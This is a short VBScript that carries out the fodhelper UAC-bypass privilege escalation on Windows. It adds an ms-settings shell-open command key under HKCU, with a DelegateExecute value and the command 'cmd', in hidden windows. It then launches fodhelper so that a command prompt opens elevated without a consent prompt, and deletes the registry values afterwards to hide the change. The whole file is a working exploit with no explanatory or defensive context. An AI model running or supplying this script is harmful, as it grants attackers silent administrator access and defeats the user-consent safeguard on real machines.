DIM wsh
Set wsh=WScript.CreateObject("wscript.shell")
wsh.Run "reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d hello /f",0,true
wsh.Run "reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /t REG_SZ /d cmd /f",0,true
wsh.Run "fodhelper",0,true
WScript.Sleep 3000
wsh.Run "reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /va /f",0,true
Set wsh=NoThing
WScript.quit
